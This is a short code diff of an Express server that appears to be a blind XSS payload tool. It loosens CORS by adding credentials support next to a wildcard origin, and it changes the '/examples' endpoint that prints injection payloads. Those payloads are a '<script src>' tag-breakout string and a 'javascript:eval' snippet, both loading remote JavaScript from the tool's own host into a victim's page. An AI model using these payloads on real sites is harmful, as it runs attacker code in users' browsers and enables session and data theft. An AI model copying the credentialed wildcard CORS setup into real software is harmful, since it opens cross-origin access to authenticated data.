@@ -24,6 +24,7 @@ app.use(function (req, res, next) {
   res.header("Access-Control-Allow-Origin", "*");
   res.header("Access-Control-Allow-Methods", "GET,POST");
   res.header("Access-Control-Allow-Headers", "Content-Type");
+    res.header("Access-Control-Allow-Credentials", "true");
   next();
 });
 
@@ -95,8 +96,8 @@ async function uploadImage(image) {
 app.get("/examples", (req, res) => {
   res.header("Content-Type", "text/plain");
   //var url = req.protocol + '://' + req.headers['host']
-  //var url = "https://globalcu.org" + req.headers["host"];
-  var url = "https://globalcu.org";
+  var url = "https://" + req.headers["host"];
+  //var url = "https://globalcu.org";
   var page = "";
   page += `\'"><script src="${url}"></script>\n\n`;
   page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
